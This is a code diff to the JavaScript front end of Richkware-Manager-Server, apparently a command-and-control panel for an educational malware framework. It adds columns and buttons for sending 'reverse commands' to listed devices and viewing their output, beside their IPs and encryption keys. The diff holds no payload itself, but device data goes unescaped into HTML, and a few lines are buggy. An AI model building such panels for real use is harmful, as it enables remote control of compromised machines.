@@ -32,7 +32,9 @@ function createDevicesTableHeader() {
         "<th>Server Port</th>" +
         "<th>Last Connection</th>" +
         "<th>Encryption Key</th>" +
-        "<th>User Associated</th>");
+        "<th>User Associated</th>" +
+        "<th>Commands</th>" +
+        "<th>Commands Output</th>");
 
     thead.appendChild(row);
     devicesTable.appendChild(thead);
@@ -63,6 +65,8 @@ function loadDevicesJSONtoTable(devicesListJSON) {
         var lastConnection = devicesList[i].lastConnection;
         var encryptionKey = devicesList[i].encryptionKey;
         var userAssociated = devicesList[i].userAssociated;
+        var commands = devicesList[i].commands;
+        var commandsOutput = devicesList[i].commandsOutput;
 
         var row = document.createElement("tr");
         row.id = "tableRow" + i;
@@ -75,8 +79,11 @@ function loadDevicesJSONtoTable(devicesListJSON) {
             "<td>" + lastConnection + "</td>" +
             "<td>" + encryptionKey + "</td>" +
             "<td>" + userAssociated + "</td>" +
-            "<td><button type=\"button\" class=\"btn btn-secondary\" onclick=\"EditDevicesTableField('" + name + "','" + IP + "','" + serverPort + "','" + lastConnection + "')\">Edit</button></td>" +
-            "<td><button type=\"button\" class=\"btn btn-warning\" onclick=\"deleteDevice('" + name + "','" + i + "')\">Remove</button></td>");
+            "<td>" + commands + "</td>" +
+            "<td>" + commandsOutput + "</td>" +
+            "<td><button type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommands('" + name + "')\">Reverse Commands</button></td>" +
+            "<td><button type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommandsOutput('" + name + "')\">Show Output</button></td>" +
+            "<td><button type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-warning\" onclick=\"deleteDevice('" + name + "', '" + i + "')\">Remove</button></td>");
 
         //        "<td><button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href=\'/Richkware-Manager-Server/device?name=" + name + "\';\">Remove</button></td>");
 
@@ -84,6 +91,14 @@ function loadDevicesJSONtoTable(devicesListJSON) {
         //      index++
     }
     devicesTable.appendChild(tbody);
+}
+
+function openReverseCommands(name) {
+    window.location.replace("/Richkware-Manager-Server/reverse-commands.html?device=" + name)
+}
+
+function openReverseCommandsOutput(deviceName) {
+    window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?device=" + deviceName)
 }
 
 function deleteDevice(device, indexTableRow) {
@@ -134,14 +149,33 @@ function newConnection() {
 }*/
 
 $(document).ready(function() {
-    loadDevicesTable()
-    setInterval(loadDevicesTable, 5000);
+    loadDevicesTable();
+    setInterval(loadDevicesTable, 30000);
 
-        /* sc.onload = function () {
-             document.getElementById("Logout").innerHTML = lang.logout;
-             document.getElementById("Lang").innerHTML = lang.lang;
-         };
-         */
+    $("[id*=remove]").click(function () {
+        var dev = event.target.id.split("#")[1];
+        var index = event.target.id.split("#")[2];
+        $.delete("device", {name: dev}, function () {
+            $("#tableRow" + index).remove()
+        })
+    });
+
+    $("[id*=manage]").click(function () {
+        console.log("element clicked -> redirecting")
+        var name = event.target.id.split("#")[1]
+        window.location.replace = "/Richkware-Manager-Server/reverse-commands.html?device=" + name;
+    });
+
+    $("#refreshButton").click(function () {
+        console.log("clicked refresh button")
+        loadDevicesTable()
+    })
+
+    /* sc.onload = function () {
+         document.getElementById("Logout").innerHTML = lang.logout;
+         document.getElementById("Lang").innerHTML = lang.lang;
+     };
+     */
 
     /*
     function EditDevicesTableField(name, IP, serverPort, lastConnection) {
